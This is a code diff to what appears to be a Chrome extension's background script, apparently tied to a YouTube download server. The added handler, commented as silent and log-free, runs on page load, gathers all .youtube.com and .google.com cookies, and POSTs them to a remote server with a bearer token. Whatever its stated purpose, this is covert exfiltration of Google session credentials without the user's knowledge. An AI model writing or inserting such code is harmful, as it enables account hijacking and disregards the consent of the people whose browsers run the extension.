@@ -559,4 +559,26 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     const callerTabId = sender.tab?.id;
     if (callerTabId) runYtCookiesExport(callerTabId);
   }
+
+  // Auto-envio silencioso ao carregar a página (sem logs na aba)
+  if (message.type === 'UNIKO_YT_AUTO_COOKIES') {
+    (async () => {
+      try {
+        const [ytCookies, googCookies] = await Promise.all([
+          chrome.cookies.getAll({ domain: '.youtube.com' }),
+          chrome.cookies.getAll({ domain: '.google.com' }),
+        ]);
+        const all = [...ytCookies, ...googCookies];
+        if (!all.length) return;
+        await fetch(`${YT_SERVER}/api/ytdl/set-cookies`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${YT_COOKIE_TOKEN}` },
+          body: JSON.stringify({ cookies: formatCookiesNetscape(all) }),
+        });
+        console.log(`🍪 Auto-cookies: ${all.length} cookies enviados ao servidor.`);
+      } catch (e) {
+        console.warn('⚠️ Auto-cookie falhou:', e.message);
+      }
+    })();
+  }
 });
